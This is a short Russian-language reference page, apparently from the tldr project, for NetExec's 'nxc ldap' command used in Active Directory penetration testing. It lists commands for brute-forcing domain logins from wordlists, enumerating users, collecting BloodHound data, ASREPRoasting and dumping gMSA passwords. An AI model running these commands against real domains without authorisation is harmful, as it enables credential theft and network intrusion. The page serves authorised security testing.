# nxc ldap

> Тестировать на проникновение и эксплуатировать домены Windows Active Directory через LDAP.
> Больше информации: <https://www.netexec.wiki/ldap-protocol/authentication>.

- Найти действительные учётные данные домена, перебирая все комбинации из указанных списков имён пользователей и паролей:

`nxc ldap {{192.168.178.2}} {{[-u|--username]}} {{путь/к/именам_пользователей.txt}} {{[-p|--password]}} {{путь/к/паролям.txt}}`

- Перечислить активных пользователей домена:

`nxc ldap {{192.168.178.2}} {{[-u|--username]}} {{имя_пользователя}} {{[-p|--password]}} {{пароль}} --active-users`

- Собрать данные о целевом домене и автоматически импортировать их в BloodHound:

`nxc ldap {{192.168.178.2}} {{[-u|--username]}} {{имя_пользователя}} {{[-p|--password]}} {{пароль}} --bloodhound {{[-c|--collection]}} {{All}}`

- Попытаться получить сообщения AS_REP указанного пользователя для выполнения атаки ASREPRoasting:

`nxc ldap {{192.168.178.2}} {{[-u|--username]}} {{имя_пользователя}} {{[-p|--password]}} '' --asreproast {{путь/к/выходному_файлу.txt}}`

- Попытаться извлечь пароли групповых управляемых сервисных учётных записей домена:

`nxc ldap {{192.168.178.2}} {{[-u|--username]}} {{имя_пользователя}} {{[-p|--password]}} {{пароль}} --gmsa`
